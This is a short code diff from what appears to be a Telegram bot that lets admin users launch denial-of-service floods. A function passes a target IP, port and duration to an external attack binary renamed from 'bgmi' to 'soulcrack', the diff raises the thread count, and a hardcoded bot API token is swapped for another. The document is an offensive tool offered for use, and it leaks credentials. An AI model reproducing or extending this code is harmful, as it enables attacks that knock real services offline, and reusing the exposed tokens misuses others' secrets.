@@ -12,7 +12,7 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Replace with your actual bot token and admin IDs
-API_TOKEN = "7462662021:AAEweEFo0qpj7XLqNgC6Ggb0PgThDfqMx2Y"
+API_TOKEN = "7462662021:AAH9NXv-5uFggszXpIolXk0sSHCiYkesn5Q"
 ADMIN_IDS = {1163610781}  # Example: set of admin IDs
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -138,7 +138,7 @@ def send_telegram_message(chat_id, text):
 def attack_thread(ip, port, attack_time, attack_id):
     try:
         start_time = time.time()
-        command = f"./bgmi {ip} {port} {attack_time} 1200"
+        command = f"./soulcrack {ip} {port} {attack_time} 1300"
         process = subprocess.Popen(command, shell=True)
         time.sleep(attack_time)  # Wait for attack time
 
